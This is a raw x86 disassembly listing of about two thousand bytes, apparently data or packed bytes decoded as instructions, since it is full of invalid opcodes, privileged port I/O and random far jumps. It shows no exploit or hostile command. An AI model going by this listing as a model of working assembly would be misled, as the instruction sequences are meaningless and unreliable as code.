  530451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  530452:	scas   eax,DWORD PTR es:[edi]
  530453:	mov    cl,0x39
  530455:	fisubr WORD PTR [ebx+0x18bd4850]
  53045b:	xchg   ebp,eax
  53045c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53045d:	repnz mov edi,0x55173a5
  530463:	stos   BYTE PTR es:[edi],al
  530464:	ficomp DWORD PTR [ecx+0x7b]
  530467:	je     0x53048a
  530469:	cmp    BYTE PTR [edx],cl
  53046b:	fnstenv [ecx]
  53046d:	xchg   esi,eax
  53046e:	add    edx,ecx
  530470:	mov    al,ds:0xfa135ae6
  530475:	adc    dl,al
  530477:	inc    edx
  530478:	test   BYTE PTR [ebp+0x28a05240],0xe1
  53047f:	out    0x50,eax
  530481:	scas   eax,DWORD PTR es:[edi]
  530482:	mov    ah,0xb3
  530484:	hlt    
  530485:	xchg   edx,eax
  530486:	jbe    0x530482
  530488:	dec    edx
  530489:	sqrtps xmm7,XMMWORD PTR [ebx+0x341176bd]
  530490:	pop    edi
  530491:	jne    0x5304b7
  530493:	xchg   esp,eax
  530494:	add    DWORD PTR [eax-0x28437358],esp
  53049a:	jecxz  0x5304d8
  53049c:	push   edi
  53049d:	mov    ds:0x658ab206,eax
  5304a2:	jle    0x530474
  5304a4:	retf   0x9783
  5304a7:	int3   
  5304a8:	dec    esi
  5304a9:	or     BYTE PTR [ecx-0x55a5af1],0x3d
  5304b0:	cmp    eax,0x91a62739
  5304b5:	rol    BYTE PTR [edx+0x2eb6e049],cl
  5304bb:	xchg   esi,eax
  5304bc:	es xchg edi,eax
  5304be:	in     al,dx
  5304bf:	jnp    0x530465
  5304c1:	fimul  WORD PTR [edi-0x70]
  5304c4:	ror    DWORD PTR [edi],cl
  5304c6:	cmc    
  5304c7:	mov    ds:0x4c781ce5,al
  5304cc:	or     BYTE PTR [eax+0x5c81cfb8],dl
  5304d2:	out    dx,eax
  5304d3:	sub    dl,cl
  5304d5:	or     DWORD PTR [eax+0x43],ebp
  5304d8:	sub    al,0xf5
  5304da:	xchg   ebp,eax
  5304db:	add    BYTE PTR ds:0x15331c72,dh
  5304e1:	pop    edi
  5304e2:	dec    esi
  5304e3:	and    cl,BYTE PTR [edx+0x53521e26]
  5304e9:	dec    ebp
  5304ea:	sub    cl,BYTE PTR [edi]
  5304ec:	cmp    bl,BYTE PTR [edi+0x104afd18]
  5304f2:	jmp    0x2994:0x5f63a84b
  5304f9:	stos   DWORD PTR es:[edi],eax
  5304fa:	add    eax,0x3d41a3b8
  5304ff:	dec    eax
  530500:	inc    ebx
  530501:	sub    eax,0xff6de6dc
  530506:	mov    bl,0xbc
  530508:	sahf   
  530509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53050a:	shr    ebp,cl
  53050c:	daa    
  53050d:	lds    edx,FWORD PTR [ecx+0x55]
  530510:	jmp    0x44140620
  530515:	int    0xbe
  530517:	add    eax,0x46cf3516
  53051c:	cmp    BYTE PTR [ecx+0x3e],bl
  53051f:	push   eax
  530520:	les    ebx,FWORD PTR [esi-0x46104c4f]
  530526:	mov    ebp,DWORD PTR [esi+0x419fa322]
  53052c:	enter  0x35af,0xe9
  530530:	hlt    
  530531:	popf   
  530532:	sbb    BYTE PTR [eax],0x2f
  530535:	ret    
  530536:	pop    ebp
  530537:	jmp    0xa64c05f5
  53053c:	jle    0x5304c3
  53053e:	nop
  53053f:	xor    DWORD PTR [eax],ebx
  530541:	int    0x60
  530543:	mov    esp,0x594dea7e
  530548:	and    DWORD PTR [edx+0x71f9da50],ebx
  53054e:	xor    bl,BYTE PTR [ebx]
  530550:	je     0x5305c1
  530552:	loopne 0x5305a1
  530554:	outs   dx,BYTE PTR ds:[esi]
  530555:	cmp    DWORD PTR [esi-0x2e],edx
  530558:	or     esi,DWORD PTR [ecx-0x4587ac6e]
  53055e:	pop    edx
  53055f:	repz stc 
  530561:	add    al,0x91
  530563:	int3   
  530564:	ja     0x53056e
  530566:	xor    edx,DWORD PTR [ecx-0x629f2153]
  53056c:	xor    ch,BYTE PTR [edi+0x40676765]
  530572:	(bad)  
  530573:	xor    BYTE PTR [ebx+0x1dcc9fe4],dl
  530579:	sub    eax,0x9acc0517
  53057e:	sbb    al,0xfe
  530580:	mov    dl,0xe
  530582:	cld    
  530583:	repnz dec ebp
  530585:	or     BYTE PTR [edx-0x31],dh
  530588:	div    BYTE PTR [ebp+0x2fc25834]
  53058e:	push   ebp
  53058f:	jb     0x5305e3
  530591:	xor    eax,DWORD PTR [eax+0x334fad7]
  530597:	mov    esp,DWORD PTR [edi-0x31]
  53059a:	daa    
  53059b:	adc    bl,0xb2
  53059e:	iret   
  53059f:	sbb    eax,0x80c3b2b3
  5305a4:	ins    DWORD PTR es:[edi],dx
  5305a5:	shr    DWORD PTR [edx],0xdb
  5305a8:	nop
  5305a9:	pushf  
  5305aa:	int    0xe7
  5305ac:	test   eax,0xeef01025
  5305b1:	popf   
  5305b2:	jnp    0x5305de
  5305b4:	mov    esp,ecx
  5305b6:	addr16 jne 0x530613
  5305b9:	and    al,bl
  5305bb:	xor    BYTE PTR [ebp-0x6f1ed256],cl
  5305c1:	jbe    0x5305e4
  5305c3:	jmp    0x9bd65f6f
  5305c8:	and    eax,0x1464a190
  5305cd:	mov    edx,0xdcaf55f8
  5305d2:	retf   0xa525
  5305d5:	dec    edi
  5305d6:	jecxz  0x5305c1
  5305d8:	retf   
  5305d9:	xor    eax,0xa1ef7eb9
  5305de:	aam    0xf1
  5305e0:	mov    ah,0x42
  5305e2:	jmp    0xb42a87c7
  5305e7:	cwde   
  5305e8:	inc    ax
  5305ea:	test   BYTE PTR [ecx-0x42d84d6b],0xef
  5305f1:	cmp    eax,0x17dd3648
  5305f6:	xchg   edi,eax
  5305f7:	cwde   
  5305f8:	sar    DWORD PTR [edi+0x4b],1
  5305fb:	lea    edx,[eax]
  5305fd:	in     eax,0xc6
  5305ff:	icebp  
  530600:	inc    ebx
  530601:	fs mov esi,0x69b1c6b3
  530607:	rcl    al,1
  530609:	outs   dx,BYTE PTR ds:[esi]
  53060a:	jecxz  0x530607
  53060c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  53060d:	jb     0x530605
  53060f:	sbb    eax,0x98cb661
  530614:	add    BYTE PTR [edi+0x4dcd5d9c],0x45
  53061b:	dec    esi
  53061c:	jns    0x53066e
  53061e:	in     al,dx
  53061f:	mov    ebx,0xa775def0
  530624:	sub    al,0x60
  530626:	lods   al,BYTE PTR ds:[esi]
  530627:	xchg   ebx,eax
  530628:	pushf  
  530629:	pusha  
  53062a:	or     DWORD PTR [ebp+0x3d],edx
  53062d:	jmp    0x5305cc
  53062f:	or     ch,BYTE PTR ds:0xb6962434
  530635:	xchg   ebx,eax
  530636:	mov    ds:0x81d9cf82,eax
  53063b:	dec    esi
  53063c:	xor    BYTE PTR [edx-0x69688590],ah
  530642:	lock pop edi
  530644:	les    esi,FWORD PTR [esi-0x9]
  530647:	inc    esp
  530648:	in     eax,0x19
  53064a:	loopne 0x5305d4
  53064c:	xchg   ecx,eax
  53064d:	sahf   
  53064e:	ret    
  53064f:	mov    cl,0x17
  530651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  530652:	push   ds
  530653:	sbb    bh,BYTE PTR [ecx-0x47697cc8]
  530659:	leave  
  53065a:	sti    
  53065b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53065c:	add    edi,DWORD PTR [ecx]
  53065e:	stos   BYTE PTR es:[edi],al
  53065f:	imul   eax,ebx,0xffffffa2
  530662:	push   ebx
  530663:	or     BYTE PTR [esi],bh
  530665:	jbe    0x5306a2
  530667:	mov    ebp,0x912aca25
  53066c:	pushf  
  53066d:	clc    
  53066e:	je     0x5306ce
  530670:	fcomp  QWORD PTR [eax]
  530672:	sbb    BYTE PTR [edx],cl
  530674:	dec    esp
  530675:	int    0x8c
  530677:	in     eax,0xb5
  530679:	nop
  53067a:	nop
  53067b:	mov    ds,WORD PTR [ebp-0x36b3501c]
  530681:	sub    DWORD PTR [ebx],ecx
  530683:	jmp    0x2850:0xbecd0102
  53068a:	dec    esp
  53068b:	cmp    BYTE PTR [di-0xec1],0x8d
  530691:	dec    ebx
  530692:	and    DWORD PTR [esi-0x71ab5d8],edi
  530698:	and    edx,DWORD PTR [edi+0x43435d7]
  53069e:	lds    esi,FWORD PTR [ebp+0x3554f7e0]
  5306a4:	mov    edi,0x98f71ba8
  5306a9:	add    cl,0x65
  5306ac:	xchg   esi,eax
  5306ad:	xchg   esi,eax
  5306ae:	xor    al,BYTE PTR [edx]
  5306b0:	ins    DWORD PTR es:[edi],dx
  5306b1:	pop    ecx
  5306b2:	test   al,0x61
  5306b4:	xchg   edi,eax
  5306b5:	cdq    
  5306b6:	mov    esp,0x77ab6789
  5306bb:	inc    eax
  5306bc:	pop    edx
  5306bd:	out    0xcb,al
  5306bf:	and    BYTE PTR [ecx],dh
  5306c1:	imul   edx,DWORD PTR [ecx],0xf22efa76
  5306c7:	jmp    0x530698
  5306c9:	(bad)  
  5306ca:	lods   eax,DWORD PTR ds:[esi]
  5306cb:	pop    ebp
  5306cc:	outs   dx,BYTE PTR ds:[esi]
  5306cd:	or     bh,BYTE PTR [ecx+eiz*1+0x2a316181]
  5306d4:	push   ss
  5306d5:	shl    cl,0xb7
  5306d8:	ficomp WORD PTR [edx+0x73]
  5306db:	or     al,0xed
  5306dd:	xor    eax,0xf97f1f72
  5306e2:	fsub   DWORD PTR [edx+0x19]
  5306e5:	hlt    
  5306e6:	ret    0x50ff
  5306e9:	test   al,0xc8
  5306eb:	mov    ah,0xfe
  5306ed:	mov    ecx,0x70af95cd
  5306f2:	push   ecx
  5306f3:	mov    ecx,0x3cc44d16
  5306f8:	cmp    ecx,DWORD PTR [edx]
  5306fa:	fisubr DWORD PTR [edx]
  5306fc:	pop    esi
  5306fd:	popf   
  5306fe:	in     al,dx
  5306ff:	inc    eax
  530700:	loope  0x53070f
  530702:	cdq    
  530703:	inc    edi
  530704:	call   0xbda8fdc3
  530709:	sbb    al,0xfc
  53070b:	inc    esp
  53070c:	xor    esi,0x6
  53070f:	jp     0x5306b9
  530711:	xlat   BYTE PTR ds:[ebx]
  530712:	ret    
  530713:	dec    eax
  530714:	stos   BYTE PTR es:[edi],al
  530715:	inc    edi
  530716:	jae    0x530746
  530718:	mov    al,ds:0xd37998db
  53071d:	and    eax,0xc2d519e2
  530722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  530723:	std    
  530724:	jl     0x530715
  530726:	and    BYTE PTR [edx+ebx*1],ah
  530729:	push   ss
  53072a:	retf   
  53072b:	outs   dx,DWORD PTR ds:[esi]
  53072c:	mov    bh,0x26
  53072e:	daa    
  53072f:	lea    eax,[edi+ebp*8]
  530732:	jmp    0x5d6b:0xa6f6fb2a
  530739:	clc    
  53073a:	(bad)  
  53073b:	out    0x4e,al
  53073d:	jb     0x53073a
  53073f:	fadd   DWORD PTR [ecx+0x630730b9]
  530745:	adc    esi,DWORD PTR ds:0x4b88b9e8
  53074b:	or     edx,esi
  53074d:	inc    edi
  53074e:	jge    0x530706
  530750:	or     BYTE PTR [eax-0x2f],al
  530753:	jb     0x5307af
  530755:	add    ebx,DWORD PTR [edi]
  530757:	pop    edx
  530758:	cmp    bh,BYTE PTR [ebx]
  53075a:	outs   dx,DWORD PTR ds:[esi]
  53075b:	rcr    DWORD PTR [edi+0x66],1
  53075e:	(bad)  
  530761:	dec    edi
  530762:	sbb    DWORD PTR [ecx+0x27f7c86b],0xffffff89
  530769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  53076a:	scas   ax,WORD PTR es:[edi]
  53076c:	inc    eax
  53076d:	hlt    
  53076e:	bound  eax,QWORD PTR [eax]
  530770:	lods   al,BYTE PTR ds:[esi]
  530771:	fcomp  QWORD PTR [eax-0x11]
  530774:	cmc    
  530775:	clc    
  530776:	pop    es
  530777:	sbb    dh,dl
  530779:	mov    bl,0xc5
  53077b:	clc    
  53077c:	and    esp,DWORD PTR [esi]
  53077e:	shl    DWORD PTR gs:[edi-0x77],cl
  530782:	dec    eax
  530783:	cmp    DWORD PTR [edx],esp
  530785:	pop    edx
  530786:	ficomp DWORD PTR [edi]
  530788:	push   ebp
  530789:	adc    eax,0x3fd539a0
  53078e:	push   edi
  53078f:	loop   0x5307aa
  530791:	std    
  530792:	icebp  
  530793:	das    
  530794:	jae    0x53073f
  530796:	pmulhuw mm7,QWORD PTR [ecx+ebx*1]
  53079a:	jbe    0x5307ca
  53079c:	and    ebp,DWORD PTR [edi+0x30]
  53079f:	pop    edx
  5307a0:	and    al,0x6c
  5307a2:	mov    al,ds:0x54122c10
  5307a7:	xlat   BYTE PTR ds:[ebx]
  5307a8:	sub    eax,0x95f688b6
  5307ad:	sbb    DWORD PTR [esp+edx*8+0x54],ecx
  5307b1:	jb     0x530818
  5307b3:	idiv   DWORD PTR [esi+0xe25c7f5]
  5307b9:	faddp  st(3),st
  5307bb:	(bad)  
  5307bc:	test   BYTE PTR [esi-0x284e9653],dl
  5307c2:	ret    0xfd93
  5307c5:	jbe    0x53075e
  5307c7:	pop    edi
  5307c8:	dec    ebx
  5307c9:	xchg   ecx,eax
  5307ca:	sbb    al,0x5e
  5307cc:	dec    edx
  5307cd:	ja     0x5307e2
  5307cf:	or     DWORD PTR [ecx+0xef9ba01],esi
  5307d5:	(bad)  
  5307d6:	xchg   BYTE PTR [ecx-0x2b],dh
  5307d9:	xor    eax,0xbebd8601
  5307de:	inc    eax
  5307df:	add    BYTE PTR ds:[edi+0x33a4b499],dh
  5307e6:	push   0xffffffff
  5307e8:	push   es
  5307e9:	xor    edi,DWORD PTR [ecx]
  5307eb:	add    ebp,DWORD PTR [ecx+esi*8]
  5307ee:	loopne 0x530849
  5307f0:	test   DWORD PTR [esi+0xc7139db],esi
  5307f6:	aaa    
  5307f7:	push   es
  5307f8:	xchg   esp,eax
  5307f9:	mov    ?,WORD PTR [edi-0x30c1fe09]
  5307ff:	jg     0x53086e
  530801:	loopne 0x530845
  530803:	enter  0xdccb,0xa3
  530807:	mov    al,0x57
  530809:	jno    0x530805
  53080b:	pop    es
  53080c:	mov    ah,0xcc
  53080e:	push   0x2013315a
  530813:	arpl   WORD PTR [edi+0xe2b4d6],bx
  530819:	xlat   BYTE PTR ds:[ebx]
  53081a:	push   0x9809585
  53081f:	daa    
  530820:	push   ebx
  530821:	sbb    ecx,DWORD PTR [eax*4+0x643f8956]
  530828:	add    al,BYTE PTR [ebp+ecx*1+0x9]
  53082c:	rcr    ch,0xf9
  53082f:	mov    ch,0xdb
  530831:	lahf   
  530832:	sahf   
  530833:	fcom   QWORD PTR [ebx]
  530835:	daa    
  530836:	xor    al,0xd
  530838:	add    edi,edx
  53083a:	ins    DWORD PTR es:[edi],dx
  53083b:	and    al,0xc1
  53083d:	adc    eax,0xbdf3c719
  530842:	ror    DWORD PTR [edx+0x5c5e98be],1
  530848:	retf   0x1f1c
  53084b:	jae    0x5307d2
  53084d:	add    al,0xfc
  53084f:	je     0x53089d
  530851:	fist   DWORD PTR [edi+ebx*2-0x7b081cd7]
  530858:	inc    ecx
  530859:	dec    edx
  53085a:	ret    
  53085b:	jno    0x530800
  53085d:	data16 sbb BYTE PTR [ebp+0x52],bh
  530861:	inc    ebx
  530862:	shr    ebx,0x72
  530865:	aas    
  530866:	jno    0x53080e
  530868:	into   
  530869:	ins    DWORD PTR es:[edi],dx
  53086a:	in     eax,0x60
  53086c:	adc    BYTE PTR [ebx],dh
  53086e:	mov    ds:0xfc3050db,al
  530873:	cmp    dl,ch
  530875:	out    dx,eax
  530876:	mov    ds:0x27379a5f,eax
  53087b:	mov    esp,0x4c399399
  530880:	icebp  
  530881:	sar    DWORD PTR [edx-0x21],cl
  530884:	mov    ecx,0x8060fc83
  530889:	mov    ah,0x31
  53088b:	out    dx,eax
  53088c:	mov    DWORD PTR [edi],ebx
  53088e:	out    dx,al
  53088f:	hlt    
  530890:	jle    0x5308f8
  530892:	inc    edx
  530893:	mov    dh,0xfa
  530895:	ror    DWORD PTR [eax+0x52ee2da8],0x31
  53089c:	aaa    
  53089d:	mov    ebp,0x9074158
  5308a2:	mov    al,ds:0x71afa669
  5308a7:	pop    es
  5308a8:	pop    edi
  5308a9:	nop
  5308aa:	repz das 
  5308ac:	mov    bl,0x1f
  5308ae:	imul   esp,ebp,0xdb57ee40
  5308b4:	sbb    eax,0x2e85e6ce
  5308b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5308ba:	dec    ecx
  5308bb:	pop    es
  5308bc:	sbb    ebp,edx
  5308be:	pop    edx
  5308bf:	mov    eax,DWORD PTR ds:0xaa812a1f
  5308c5:	fbstp  TBYTE PTR [ebx-0x4b]
  5308c8:	lods   eax,DWORD PTR ds:[esi]
  5308c9:	sbb    edi,ecx
  5308cb:	lds    edx,FWORD PTR [eax+edx*4]
  5308ce:	or     DWORD PTR [edi+edi*1],0xffffff95
  5308d2:	cs mov ch,0x2b
  5308d5:	adc    DWORD PTR [ebx+0x539a07c0],0xf7efbfc9
  5308df:	sbb    DWORD PTR [ebx-0x18],edx
  5308e2:	dec    esp
  5308e3:	mov    ebp,0x342db62d
  5308e8:	and    ecx,esp
  5308ea:	lods   al,BYTE PTR ds:[esi]
  5308eb:	call   0x17ddd4ec
  5308f0:	stos   DWORD PTR es:[edi],eax
  5308f1:	add    ch,BYTE PTR [edi+ebp*8+0xe2b92bb]
  5308f8:	hlt    
  5308f9:	in     eax,0x14
  5308fb:	xor    eax,0xd8f489b0
  530900:	in     eax,dx
  530901:	sbb    eax,0x91238cec
  530906:	sbb    DWORD PTR [edx-0x10],0x67
  53090a:	aaa    
  53090b:	das    
  53090c:	inc    ecx
  53090d:	sbb    eax,0xc72f956
  530912:	shl    DWORD PTR [ebx+0x4f9d1c32],cl
  530918:	pop    edx
  530919:	daa    
  53091a:	ror    bh,1
  53091c:	and    bl,bl
  53091e:	mov    bh,0x16
  530920:	mov    ebx,0xbab60a39
  530925:	inc    esp
  530926:	or     al,0xb0
  530928:	cmp    bh,al
  53092a:	mov    edx,0x17fdbeed
  53092f:	call   0xac00:0xfc1ec95c
  530936:	rcr    eax,1
  530938:	sbb    DWORD PTR [edi-0x73],0xffffffeb
  53093c:	mov    ebp,0x2ac52faa
  530941:	xchg   edx,eax
  530942:	int    0x68
  530944:	sbb    eax,0x992e4cdb
  530949:	cld    
  53094a:	push   ss
  53094b:	jmp    0xd07a3cd5
  530950:	lods   eax,DWORD PTR ds:[esi]
  530951:	out    dx,eax
  530952:	adc    DWORD PTR [esi+ebx*4],0xbfe9d07
  530959:	lock and eax,0xe3f513f
  53095f:	call   0x9828:0x9d12db13
  530966:	cs jns 0x530992
  530969:	cmp    al,0xc9
  53096b:	nop
  53096c:	fst    DWORD PTR [ecx-0x47ffab86]
  530972:	scas   al,BYTE PTR es:[edi]
  530973:	xchg   ebp,eax
  530974:	jl     0x530970
  530976:	mov    esi,0x629ce8fc
  53097b:	int    0x20
  53097d:	mov    ds:0x816d918d,eax
  530982:	idiv   DWORD PTR [eax+0x3277a7fd]
  530988:	xor    dl,cl
  53098a:	lahf   
  53098b:	xor    al,0x6d
  53098d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53098e:	imul   ebx,DWORD PTR ds:0x84919006,0xefb85ceb
  530998:	mov    eax,ds:0xd41ddc5f
  53099d:	daa    
  53099e:	cmp    BYTE PTR [ebx],0x64
  5309a1:	mov    ds:0x38feb68d,al
  5309a6:	ds daa 
  5309a8:	push   es
  5309a9:	xor    DWORD PTR [ebx+0x3b],0x5e
  5309ad:	inc    ebp
  5309ae:	stc    
  5309af:	push   es
  5309b0:	jo     0x530a1e
  5309b2:	xlat   BYTE PTR ds:[ebx]
  5309b3:	jno    0x530a10
  5309b5:	push   edx
  5309b6:	push   ecx
  5309b7:	sbb    bh,BYTE PTR ds:0x98c0f5d1
  5309bd:	sub    eax,0xe0456b6a
  5309c2:	xchg   esp,eax
  5309c3:	mov    cl,0x18
  5309c5:	and    ch,dl
  5309c7:	fcomip st,st(5)
  5309c9:	mov    cl,dl
  5309cb:	int3   
  5309cc:	or     eax,0x26effb93
  5309d1:	mov    ebp,0x47579ebe
  5309d6:	and    DWORD PTR [esi-0x78671754],ebx
  5309dc:	jns    0x530a28
  5309de:	aas    
  5309df:	mov    bh,BYTE PTR [esi+0x770b5837]
  5309e5:	sub    cl,dl
  5309e7:	push   esp
  5309e8:	cld    
  5309e9:	jo     0x53097c
  5309eb:	leave  
  5309ec:	mov    cs:0x694c29c3,eax
  5309f2:	push   cs
  5309f3:	or     cl,BYTE PTR [ecx-0x5e]
  5309f6:	xchg   DWORD PTR [ebp-0x7885d751],edx
  5309fc:	jnp    0x530a42
  5309fe:	outs   dx,BYTE PTR ds:[esi]
  5309ff:	push   ebx
  530a00:	mov    eax,ebx
  530a02:	adc    eax,0xdb83d43a
  530a07:	mov    ah,0x0
  530a09:	cmp    ebp,DWORD PTR [ecx+0x24]
  530a0c:	pop    esi
  530a0d:	push   cs
  530a0e:	pop    esp
  530a0f:	sub    eax,0xc88c2605
  530a14:	cmp    ecx,DWORD PTR [edx]
  530a16:	sbb    bh,BYTE PTR [ecx+esi*4-0x3c9ff39e]
  530a1d:	push   edx
  530a1e:	mov    al,ds:0x26563744
  530a23:	cwde   
  530a24:	mov    ch,BYTE PTR [edi-0x1e45f06f]
  530a2a:	dec    esp
  530a2b:	jno    0x530a9a
  530a2d:	pop    esp
  530a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  530a2f:	sbb    al,0x10
  530a31:	in     al,dx
  530a32:	cli    
  530a33:	jno    0x5309bb
  530a35:	jb     0x5309d9
  530a37:	loope  0x530aa9
  530a39:	scas   al,BYTE PTR es:[edi]
  530a3a:	in     eax,0xeb
  530a3c:	mov    ds:0xb3813355,al
  530a41:	ins    DWORD PTR es:[edi],dx
  530a42:	retf   
  530a43:	jge    0x530a94
  530a45:	not    BYTE PTR [edx-0x22]
  530a48:	lea    ecx,[eax-0x66]
  530a4b:	and    al,0xb6
  530a4d:	sahf   
  530a4e:	(bad)
  530a52:	gs push eax
  530a54:	out    0xb5,al
  530a56:	xchg   ecx,eax
  530a57:	lea    edx,[edi-0xec3cc82]
  530a5d:	xor    BYTE PTR [ebx],al
  530a5f:	ja     0x530a23
  530a61:	fs and al,0xc0
  530a64:	fmul   DWORD PTR [ebx]
  530a66:	loope  0x530a27
  530a68:	addr16 dec ebx
  530a6a:	sbb    edi,DWORD PTR [eax+0x118bc3db]
  530a70:	cmc    
  530a71:	add    BYTE PTR [bp+di],ch
  530a74:	int3   
  530a75:	leave  
  530a76:	pop    eax
  530a77:	daa    
  530a78:	add    ebp,DWORD PTR [ebx+0x67]
  530a7b:	(bad)  
  530a7c:	push   ebx
  530a7d:	jg     0x530ae8
  530a7f:	add    al,0x92
  530a81:	cmp    ebx,DWORD PTR [esi+0x48219946]
  530a87:	scas   al,BYTE PTR es:[edi]
  530a88:	pop    esi
  530a89:	add    al,0xa
  530a8b:	inc    ecx
  530a8c:	std    
  530a8d:	inc    esi
  530a8e:	shr    al,0xf3
  530a91:	loope  0x530ae4
  530a93:	loop   0x530aa8
  530a95:	fidiv  WORD PTR [ebp-0x6b]
  530a98:	adc    eax,0xdc0fa149
  530a9d:	imul   ebp,DWORD PTR [edx+ecx*2],0x1b
  530aa1:	pop    esp
  530aa2:	ret    0x419a
  530aa5:	lods   eax,DWORD PTR ds:[esi]
  530aa6:	sbb    bl,BYTE PTR [eax+ebx*2+0x44488bb4]
  530aad:	adc    bh,BYTE PTR [eax-0x5e]
  530ab0:	mov    esp,0x7f5f3b52
  530ab5:	adc    ch,dl
  530ab7:	mov    ds:0x3fba8bfb,eax
  530abc:	xchg   edi,eax
  530abd:	int3   
  530abe:	xor    edx,DWORD PTR [eax-0x10]
  530ac1:	rol    DWORD PTR [esi],1
  530ac3:	inc    edi
  530ac4:	dec    edi
  530ac5:	jge    0x530a7f
  530ac7:	xor    bl,BYTE PTR [eax+0x51]
  530aca:	mov    WORD PTR [eax+0x7a],ss
  530acd:	les    ecx,FWORD PTR [eax]
  530acf:	mov    edi,0x460a3b9a
  530ad4:	lea    esi,[ebx]
  530ad6:	sbb    al,0x48
  530ad8:	dec    ebx
  530ad9:	je     0x530ab7
  530adb:	jp     0x530b41
  530add:	inc    eax
  530ade:	inc    edi
  530adf:	mov    dl,0xf
  530ae1:	int    0xb8
  530ae3:	iret   
  530ae4:	test   eax,0x58a813ba
  530ae9:	jns    0x530b0f
  530aeb:	dec    ecx
  530aec:	bnd ret 
  530aee:	mov    dl,0xc3
  530af0:	pop    ebx
  530af1:	test   ah,bl
  530af3:	adc    ebx,DWORD PTR [esi-0x51]
  530af6:	xor    al,0xfd
  530af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  530af9:	sub    BYTE PTR [ebx-0x5431a066],dh
  530aff:	cmp    ebx,ebp
  530b01:	push   ecx
  530b02:	dec    esp
  530b03:	dec    eax
  530b04:	jbe    0x530a95
  530b06:	pop    ss
  530b07:	mul    DWORD PTR [eax-0x5b367c48]
  530b0d:	and    ebp,ebp
  530b0f:	enter  0x69de,0x3f
  530b13:	(bad)  
  530b14:	int    0xcc
  530b16:	cs mov bh,0x6
  530b19:	inc    edx
  530b1a:	(bad)  
  530b1b:	fidiv  DWORD PTR [ebp+0x6e]
  530b1e:	ins    BYTE PTR es:[edi],dx
  530b1f:	mov    esp,0x323458f3
  530b24:	xchg   ebx,eax
  530b25:	mov    eax,ds:0x1ee6d385
  530b2a:	(bad)  
  530b2b:	adc    al,0xae
  530b2d:	xchg   edi,eax
  530b2e:	fnstcw WORD PTR [edi+0xd85a71c]
  530b34:	sub    al,0x95
  530b36:	fcomip st,st(7)
  530b38:	icebp  
  530b39:	aas    
  530b3a:	mov    edi,ebp
  530b3c:	addr16 or al,0x53
  530b3f:	sub    eax,0x7b4a016d
  530b44:	shr    BYTE PTR [esi],cl
  530b46:	call   0x3384:0x7bf5414c
  530b4d:	clc    
  530b4e:	xor    bh,BYTE PTR [di-0x7c]
  530b52:	sub    edx,DWORD PTR [ebp+0x4f]
  530b55:	out    0xd5,eax
  530b57:	repnz push ebx
  530b59:	jae    0x530b28
  530b5b:	repnz loopne 0x530bba
  530b5e:	add    edi,DWORD PTR [ebx+0x30105041]
  530b64:	xchg   ebp,eax
  530b65:	and    DWORD PTR [ecx],ecx
  530b67:	xor    eax,0x21312d1f
  530b6c:	dec    ecx
  530b6d:	inc    esi
  530b6e:	xchg   ebx,eax
  530b6f:	ins    DWORD PTR es:[edi],dx
  530b70:	lds    esp,FWORD PTR [edx+ebx*1]
  530b73:	cld    
  530b74:	xlat   BYTE PTR ds:[ebx]
  530b75:	sbb    BYTE PTR [edi],al
  530b77:	in     eax,0x3b
  530b79:	sbb    BYTE PTR [ebx-0x22],ah
  530b7c:	mov    cl,0x1
  530b7e:	pop    es
  530b7f:	cmp    eax,0xd5f4b81
  530b84:	and    ch,BYTE PTR [ecx+ecx*8-0x22]
  530b88:	test   BYTE PTR [eax],bl
  530b8a:	or     bh,BYTE PTR [edx-0xceb548]
  530b90:	pop    ecx
  530b91:	jne    0x530bbd
  530b93:	add    ecx,DWORD PTR [eax]
  530b95:	jb     0x530b94
  530b97:	sbb    esp,edx
  530b99:	fidivr DWORD PTR [ecx]
  530b9b:	cmp    eax,eax
  530b9d:	pushf  
  530b9e:	shl    ah,1
  530ba0:	mov    bl,0xae
  530ba2:	jge    0x530b6b
  530ba4:	jo     0x530bed
  530ba6:	pushf  
  530ba7:	inc    ebp
  530ba8:	popf   
  530ba9:	dec    ecx
  530baa:	adc    edx,DWORD PTR [edx]
  530bac:	dec    ebx
  530bad:	test   eax,0x594a6696
  530bb2:	loopne 0x530b86
  530bb4:	add    bl,ah
  530bb6:	mov    ds:0xefe20b39,al
  530bbb:	pop    edi
  530bbc:	mov    eax,0xb5da09a0
  530bc1:	fist   WORD PTR [esi+0x57]
  530bc4:	popa   
  530bc5:	mov    ah,0xe3
  530bc7:	retf   
  530bc8:	fcomp  QWORD PTR [esi-0x65c08a97]
  530bce:	xor    bl,BYTE PTR ds:0xdc01510
  530bd4:	and    edi,ecx
  530bd6:	imul   ecx,DWORD PTR [esi*1+0x4583aaf9],0xb0902320
  530be1:	ficom  WORD PTR [edx+ebp*4]
  530be4:	or     esi,esi
  530be6:	(bad)  
  530be7:	xchg   esi,eax
  530be8:	pop    esp
  530be9:	sub    ecx,DWORD PTR [esi-0x5fdc716b]
  530bef:	pop    ds
  530bf0:	addr16 mov ds:0x7d0e,al
  530bf4:	test   BYTE PTR [edx-0x65],dl
  530bf7:	imul   eax,DWORD PTR [edi-0x73],0xffffff92
  530bfb:	in     eax,0x73
  530bfd:	inc    esi
  530bfe:	inc    esp
  530bff:	aas    
  530c00:	(bad)  
  530c01:	neg    DWORD PTR [ebx-0x53750c6b]
  530c07:	jecxz  0x530c5c
  530c09:	rcr    DWORD PTR [ecx+0x5a746276],cl
  530c0f:	pop    esi
  530c10:	or     cl,cl
  530c12:	scas   al,BYTE PTR es:[edi]
  530c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  530c14:	mov    ds,esp
  530c16:	and    dl,BYTE PTR [esi+0x7]
  530c19:	inc    edi
  530c1a:	popw   es
  530c1c:	xchg   ecx,eax
  530c1d:	cmp    eax,DWORD PTR [esi+0x5]
  530c20:	xchg   edi,eax
  530c21:	pop    eax
  530c22:	imul   ecx,DWORD PTR [ebx+0x7eba623b],0x56edcdf0
  530c2c:	dec    esi
